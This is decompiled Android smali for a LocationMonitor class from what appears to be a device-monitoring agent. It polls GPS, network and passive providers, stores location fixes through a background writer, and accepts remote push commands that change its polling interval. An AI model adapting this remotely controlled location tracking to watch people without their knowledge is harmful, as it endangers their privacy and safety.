.class public Lcom/hp/vd/module/monitor/LocationMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "LocationMonitor.java"


# static fields
.field public static final ATTRIBUTE_PROBE_INTERVAL:Ljava/lang/String; = "probe_interval"

.field public static final ATTRIBUTE_SKIP_ITERATION:Ljava/lang/String; = "skip_iteration"

.field public static final COMMAND_ARGUMENT_NEW_PROBE_INTERVAL:Ljava/lang/String; = "new_probe_interval"

.field public static final COMMAND_CHANGE_PROBE_INTERVAL:Ljava/lang/String; = "loc_change_probe_interval"

.field public static final COMMAND_CHECK_LOCATION_PROVIDERS:Ljava/lang/String; = "check_location_providers"

.field protected static TAG:Ljava/lang/String; = "LocationMonitor"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/LocationData;",
            ">;"
        }
    .end annotation
.end field

.field protected commandReceiver:Lcom/hp/vd/module/monitor/location/FcmCommandReceiver;

.field protected lastSynchronization:Ljava/lang/Long;

.field protected locationListener:Landroid/location/LocationListener;

.field protected locationManager:Landroid/location/LocationManager;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected monitoringStatus:Z

.field protected writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/QueueConsumerDao<",
            "Lcom/hp/vd/data/LocationData;",
            ">;"
        }
    .end annotation
.end field

.field protected writerThread:Ljava/lang/Thread;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 35
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 47
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 49
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationManager:Landroid/location/LocationManager;

    .line 50
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationListener:Landroid/location/LocationListener;

    .line 52
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 53
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 55
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->writerThread:Ljava/lang/Thread;

    .line 57
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/location/FcmCommandReceiver;

    .line 59
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x0

    .line 60
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->monitoringStatus:Z

    return-void
.end method


# virtual methods
.method public checkProviderStatus(Ljava/lang/String;)Z
    .locals 4

    .line 440
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 443
    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationManager:Landroid/location/LocationManager;

    const/4 v2, 0x0

    if-nez v1, :cond_0

    .line 444
    sget-object p1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v1, "checkProviderStatus(): locationManager = NULL. About to return FALSE."

    const/4 v3, 0x3

    invoke-interface {v0, p1, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2

    :cond_0
    const/4 v1, 0x4

    .line 450
    :try_start_0
    iget-object v3, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationManager:Landroid/location/LocationManager;

    invoke-virtual {v3, p1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result p1
    :try_end_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 456
    :catch_0
    sget-object p1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v3, "checkProviderStatus(): SecurityException caught."

    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_0

    .line 453
    :catch_1
    sget-object p1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v3, "checkProviderStatus(): IllegalArgumentException caught."

    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :goto_0
    move p1, v2

    :goto_1
    return p1
.end method

.method public deinitialize()Z
    .locals 2

    .line 182
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationManager:Landroid/location/LocationManager;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    .line 183
    iput-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationManager:Landroid/location/LocationManager;

    .line 186
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationListener:Landroid/location/LocationListener;

    if-eqz v0, :cond_1

    .line 187
    iput-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationListener:Landroid/location/LocationListener;

    .line 190
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    if-eqz v0, :cond_2

    .line 191
    iput-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    :cond_2
    const/4 v0, 0x1

    return v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 78
    const-class v0, Lcom/hp/vd/data/LocationData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 83
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 85
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 86
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 87
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 88
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LocationMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x5

    .line 89
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v5.0"

    .line 90
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data=text;"

    .line 92
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 94
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "probe_interval=290;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 95
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "skip_iteration=true;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    const/4 v1, 0x3

    .line 97
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 98
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 100
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "LocationMonitor"

    return-object v0
.end method

.method protected hasAttachIntervalExpiredForFroyo()Z
    .locals 9

    .line 381
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->lastSynchronization:Ljava/lang/Long;

    .line 382
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    div-long/2addr v1, v3

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    .line 383
    iget-object v2, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "probe_interval"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    if-eqz v0, :cond_0

    .line 385
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    sub-long v7, v3, v5

    int-to-long v2, v2

    cmp-long v0, v7, v2

    if-gez v0, :cond_0

    const/4 v0, 0x0

    return v0

    .line 389
    :cond_0
    iput-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x1

    return v0
.end method

.method public initialize()Z
    .locals 5

    .line 108
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LocationMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 120
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LocationMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 124
    sget-object v2, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v3, "Could not load persisted module data (probe_interval)."

    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 130
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LocationMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 137
    :goto_0
    new-instance v1, Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1}, Lcom/hp/vd/data/concurrency/BlockingQueue;-><init>()V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 143
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LocationMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "location"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/location/LocationManager;

    iput-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationManager:Landroid/location/LocationManager;

    .line 145
    new-instance v1, Lcom/hp/vd/module/monitor/location/ProviderMapper;

    invoke-direct {v1}, Lcom/hp/vd/module/monitor/location/ProviderMapper;-><init>()V

    .line 147
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0xe

    if-lt v2, v3, :cond_0

    .line 148
    sget-object v2, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v3, "initialize(): creating listener for SDK >= 14."

    invoke-interface {v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 150
    new-instance v2, Lcom/hp/vd/module/monitor/location/LocationListenerICS;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v2, v3, v1, v0}, Lcom/hp/vd/module/monitor/location/LocationListenerICS;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/module/monitor/location/ProviderMapper;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v2, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationListener:Landroid/location/LocationListener;

    goto :goto_1

    .line 153
    :cond_0
    sget-object v2, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v3, "initialize(): creating listener for SDK < 13."

    invoke-interface {v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 155
    new-instance v2, Lcom/hp/vd/module/monitor/location/LocationListenerFroyo;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationManager:Landroid/location/LocationManager;

    invoke-direct {v2, v3, v1, v4, v0}, Lcom/hp/vd/module/monitor/location/LocationListenerFroyo;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/module/monitor/location/ProviderMapper;Landroid/location/LocationManager;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v2, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationListener:Landroid/location/LocationListener;

    .line 165
    :goto_1
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LocationMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v1
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    .line 174
    new-instance v2, Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v2, v3, v1, v0}, Lcom/hp/vd/data/concurrency/QueueConsumerDao;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v2, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const/4 v0, 0x1

    return v0

    :catch_1
    move-exception v1

    .line 168
    sget-object v2, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v3, "Could not create the Dao"

    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 169
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    const/4 v0, 0x0

    return v0
.end method

.method public install(Ljava/lang/String;)Z
    .locals 0

    .line 65
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_0

    const/4 p1, 0x0

    return p1

    :cond_0
    const/16 p1, 0x190

    .line 69
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/module/monitor/LocationMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    const/4 p1, 0x1

    return p1
.end method

.method public isStarted()Z
    .locals 1

    .line 435
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->monitoringStatus:Z

    return v0
.end method

.method public persistModuleData(Lcom/hp/vd/data/ModuleData;)Z
    .locals 0

    .line 474
    invoke-virtual {p0, p1}, Lcom/hp/vd/module/monitor/LocationMonitor;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result p1

    return p1
.end method

.method public start()Z
    .locals 11

    .line 218
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LocationMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 219
    sget-object v1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v2, "start() called."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 225
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LocationMonitor;->isActivated()Z

    move-result v1

    const/4 v2, 0x0

    if-nez v1, :cond_0

    .line 226
    sget-object v1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v3, "This module is currently DEactivated."

    invoke-interface {v0, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v2

    .line 235
    :cond_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/location/FcmCommandReceiver;

    if-nez v1, :cond_1

    .line 237
    :try_start_0
    new-instance v1, Lcom/hp/vd/module/monitor/location/FcmCommandReceiver;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LocationMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v4

    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v4

    invoke-direct {v1, p0, v3, v4}, Lcom/hp/vd/module/monitor/location/FcmCommandReceiver;-><init>(Lcom/hp/vd/module/monitor/LocationMonitor;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/location/FcmCommandReceiver;

    .line 238
    new-instance v1, Landroid/content/IntentFilter;

    invoke-direct {v1}, Landroid/content/IntentFilter;-><init>()V

    const-string v3, "com.hp.vb.FCM_COMMAND_RECEIVED"

    .line 240
    invoke-virtual {v1, v3}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 242
    iget-object v3, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    iget-object v4, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/location/FcmCommandReceiver;

    invoke-virtual {v3, v4, v1}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 243
    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    sget-object v3, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v4, "fcm: commandReceiver was registered in locmon"

    invoke-interface {v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 246
    iget-object v3, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v3

    sget-object v4, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v5, "fcm: Exception caught while registering receiver"

    invoke-interface {v3, v4, v5, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 254
    :cond_1
    :goto_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "skip_iteration"

    invoke-virtual {v1, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v1

    const/4 v3, 0x2

    const/4 v4, 0x1

    if-ne v4, v1, :cond_4

    .line 255
    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "skip_iteration"

    const-string v6, "false"

    invoke-virtual {v1, v5, v6}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 257
    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0, v1}, Lcom/hp/vd/module/monitor/LocationMonitor;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v1

    const/4 v5, 0x3

    if-nez v1, :cond_2

    .line 258
    sget-object v1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v6, "start(): could not persist module data (skip_iteration=false)"

    invoke-interface {v0, v1, v6, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 265
    :cond_2
    sget-object v1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v6, "start(): skipping iteration"

    invoke-interface {v0, v1, v6, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 273
    new-array v1, v5, [Ljava/lang/String;

    const-string v5, "gps"

    aput-object v5, v1, v2

    const-string v5, "network"

    aput-object v5, v1, v4

    const-string v5, "passive"

    aput-object v5, v1, v3

    .line 279
    array-length v5, v1

    :goto_1
    if-ge v2, v5, :cond_3

    aget-object v6, v1, v2

    .line 280
    invoke-virtual {p0, v6}, Lcom/hp/vd/module/monitor/LocationMonitor;->checkProviderStatus(Ljava/lang/String;)Z

    move-result v7

    .line 282
    sget-object v8, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "start(): checking provider \'"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "\' = "

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v0, v8, v6, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    :cond_3
    return v4

    .line 292
    :cond_4
    new-array v1, v3, [I

    fill-array-data v1, :array_0

    const/4 v3, 0x0

    .line 299
    array-length v5, v1

    move-object v6, v3

    move v3, v2

    :goto_2
    if-ge v3, v5, :cond_6

    aget v7, v1, v3

    .line 300
    new-instance v8, Landroid/location/Criteria;

    invoke-direct {v8}, Landroid/location/Criteria;-><init>()V

    .line 301
    invoke-virtual {v8, v7}, Landroid/location/Criteria;->setAccuracy(I)V

    .line 304
    :try_start_1
    iget-object v7, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationManager:Landroid/location/LocationManager;

    invoke-virtual {v7, v8, v4}, Landroid/location/LocationManager;->getBestProvider(Landroid/location/Criteria;Z)Ljava/lang/String;

    move-result-object v7
    :try_end_1
    .catch Ljava/lang/IllegalArgumentException; {:try_start_1 .. :try_end_1} :catch_1

    move-object v6, v7

    goto :goto_3

    :catch_1
    move-exception v7

    .line 307
    sget-object v8, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v9, "IllegalArgumentException caught while selecting best provider"

    invoke-interface {v0, v8, v9, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_3
    if-eqz v6, :cond_5

    goto :goto_4

    :cond_5
    add-int/lit8 v3, v3, 0x1

    goto :goto_2

    .line 319
    :cond_6
    :goto_4
    sget-object v1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "start(): using provider: "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    if-nez v6, :cond_7

    .line 322
    sget-object v1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v2, "start(): provider == NULL (fine, coarse)"

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v4

    .line 327
    :cond_7
    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v1, :cond_8

    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-eqz v1, :cond_8

    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v1

    if-ne v1, v4, :cond_9

    .line 328
    :cond_8
    new-instance v1, Ljava/lang/Thread;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const-string v5, "Writer-Queue-Location"

    invoke-direct {v1, v3, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->writerThread:Ljava/lang/Thread;

    .line 329
    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->writerThread:Ljava/lang/Thread;

